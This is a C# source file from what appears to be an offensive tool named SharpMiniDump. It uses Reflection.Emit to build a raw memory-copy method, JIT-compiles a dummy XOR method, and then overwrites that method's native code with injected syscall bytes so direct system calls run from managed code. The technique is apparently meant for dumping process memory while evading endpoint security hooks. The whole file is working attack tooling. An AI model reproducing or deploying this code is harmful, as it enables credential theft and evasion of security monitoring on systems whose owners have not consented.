using System;
using System.Runtime.InteropServices;
using System.Reflection.Emit;
using System.Reflection;
using System.Security;

namespace SharpMiniDump
{
	class msil
	{
        public unsafe static IntPtr getAdrressWithMSIL(byte[] syscall)
        {
            //begin memcopy en msil
            AppDomain appD = AppDomain.CurrentDomain;
            AssemblyName assName = new AssemblyName("MethodSmasher");
            AssemblyBuilder assBuilder = appD.DefineDynamicAssembly(assName, AssemblyBuilderAccess.Run);
            AllowPartiallyTrustedCallersAttribute attr = new AllowPartiallyTrustedCallersAttribute();
            ConstructorInfo csInfo = attr.GetType().GetConstructors()[0];
            object[] obArray = new object[0];
            CustomAttributeBuilder cAttrB = new CustomAttributeBuilder(csInfo, obArray);
            assBuilder.SetCustomAttribute(cAttrB);
            ModuleBuilder mBuilder = assBuilder.DefineDynamicModule("MethodSmasher");
            UnverifiableCodeAttribute codAttr = new UnverifiableCodeAttribute();
            csInfo = codAttr.GetType().GetConstructors()[0];
            CustomAttributeBuilder modCAttrB = new CustomAttributeBuilder(csInfo, obArray);
            mBuilder.SetCustomAttribute(modCAttrB);
            TypeBuilder tBuilder = mBuilder.DefineType("MethodSmasher", TypeAttributes.Public);
            Type[] allParams = { typeof(IntPtr), typeof(IntPtr), typeof(Int32) };
            MethodBuilder methodBuilder = tBuilder.DefineMethod("OverwriteMethod", MethodAttributes.Public | MethodAttributes.Static, null, allParams);
            ILGenerator generator = methodBuilder.GetILGenerator();

            generator.Emit(OpCodes.Ldarg_0);
            generator.Emit(OpCodes.Ldarg_1);
            generator.Emit(OpCodes.Ldarg_2);
            generator.Emit(OpCodes.Volatile);
            generator.Emit(OpCodes.Cpblk);
            generator.Emit(OpCodes.Ret);

            var smasherType = tBuilder.CreateType();
            var overWriteMethod = smasherType.GetMethod("OverwriteMethod");
            //end memcopy en msil

            //begin xor dummy method
            appD = AppDomain.CurrentDomain;
            assName = new AssemblyName("SmashMe");
            assBuilder = appD.DefineDynamicAssembly(assName, AssemblyBuilderAccess.Run);
            attr = new AllowPartiallyTrustedCallersAttribute();
            csInfo = attr.GetType().GetConstructors()[0];
            obArray = new object[0];
            cAttrB = new CustomAttributeBuilder(csInfo, obArray);
            assBuilder.SetCustomAttribute(cAttrB);
            mBuilder = assBuilder.DefineDynamicModule("SmashMe");
            codAttr = new UnverifiableCodeAttribute();
            csInfo = codAttr.GetType().GetConstructors()[0];
            modCAttrB = new CustomAttributeBuilder(csInfo, obArray);
            mBuilder.SetCustomAttribute(modCAttrB);
            tBuilder = mBuilder.DefineType("SmashMe", TypeAttributes.Public);
            Int32 xorK = 0x41424344;
            Type[] allParams2 = { typeof(Int32) };
            methodBuilder = tBuilder.DefineMethod("OverwriteMe", MethodAttributes.Public | MethodAttributes.Static, typeof(Int32), allParams2);
            generator = methodBuilder.GetILGenerator();
            generator.DeclareLocal(typeof(Int32));
            generator.Emit(OpCodes.Ldarg_0);

            for (var x = 0; x < 13000; x++)
            {
                generator.Emit(OpCodes.Ldc_I4, xorK);
                generator.Emit(OpCodes.Xor);
                generator.Emit(OpCodes.Stloc_0);
                generator.Emit(OpCodes.Ldloc_0);
            }

            generator.Emit(OpCodes.Ldc_I4, xorK);
            generator.Emit(OpCodes.Xor);
            generator.Emit(OpCodes.Ret);

            var smashmeType = tBuilder.CreateType();
            var overwriteMeMethod = smashmeType.GetMethod("OverwriteMe");
            //end xor dummy method

            //jit the xor method
            for (var x = 0; x < 40; x++)
            {
                try
                {
                    var i = overwriteMeMethod.Invoke(null, new object[] { 0x11112222 });
                }
                catch (Exception e)
                {
                    if (e.InnerException != null)
                    {
                        string err = e.InnerException.Message;
                    }
                }
            }

            byte[] trap;


            if (IntPtr.Size == 4)
            {
                //32bits shcode
                trap = new byte[] { 0x90 };
            }
            else
            {
                //64bits shcode
                trap = new byte[] { 0x90 };
            }

            byte[] finalShellcode = new byte[trap.Length + syscall.Length];
            Buffer.BlockCopy(trap, 0, finalShellcode, 0, trap.Length);
            Buffer.BlockCopy(syscall, 0, finalShellcode, trap.Length, syscall.Length);

            IntPtr shellcodeAddress = Marshal.AllocHGlobal(finalShellcode.Length);

            Marshal.Copy(finalShellcode, 0, shellcodeAddress, finalShellcode.Length);

            IntPtr targetMethodAddress = getMethodAddress(overwriteMeMethod);

            object[] owParams = new object[] { targetMethodAddress, shellcodeAddress, finalShellcode.Length };
            try
            {
                overWriteMethod.Invoke(null, owParams);
            }
            catch (Exception e)
            {
                if (e.InnerException != null)
                {
                    string err = e.InnerException.Message;
                }
            }

            return targetMethodAddress;
        }

        public static IntPtr getMethodAddress(MethodInfo minfo)
        {

            IntPtr retAd = new IntPtr();
            Type typeBuilded;

            if (minfo.GetMethodImplementationFlags() == MethodImplAttributes.InternalCall)
            {
                return IntPtr.Zero;
            }

            try
            {
                typeBuilded = Type.GetType("MethodLeaker", true);
            }
            catch
            {
                AppDomain appD = AppDomain.CurrentDomain;
                AssemblyName assName = new AssemblyName("MethodLeakAssembly");
                AssemblyBuilder assBuilder = appD.DefineDynamicAssembly(assName, AssemblyBuilderAccess.Run);
                ModuleBuilder mBuilder = assBuilder.DefineDynamicModule("MethodLeakModule");
                TypeBuilder tBuilder = mBuilder.DefineType("MethodLeaker", TypeAttributes.Public);

                MethodBuilder metBuilder;
                if (IntPtr.Size == 4)
                {
                    metBuilder = tBuilder.DefineMethod("LeakMethod", MethodAttributes.Public | MethodAttributes.Static, typeof(IntPtr), null);

                }
                else
                {
                    metBuilder = tBuilder.DefineMethod("LeakMethod", MethodAttributes.Public | MethodAttributes.Static, typeof(IntPtr), null);
                }

                ILGenerator ilGen = metBuilder.GetILGenerator();

                ilGen.Emit(OpCodes.Ldftn, minfo);
                ilGen.Emit(OpCodes.Ret);

                typeBuilded = tBuilder.CreateType();
            }
            MethodInfo methodInfoBuilded = typeBuilded.GetMethod("LeakMethod");
            try
            {
                var obj = methodInfoBuilded.Invoke(null, null);
                retAd = (IntPtr)obj;
            }
            catch (Exception e)
            {
                Console.WriteLine(methodInfoBuilded.Name + " cannot return an unmanaged address.");
            }
            return retAd;
        }
    }
}
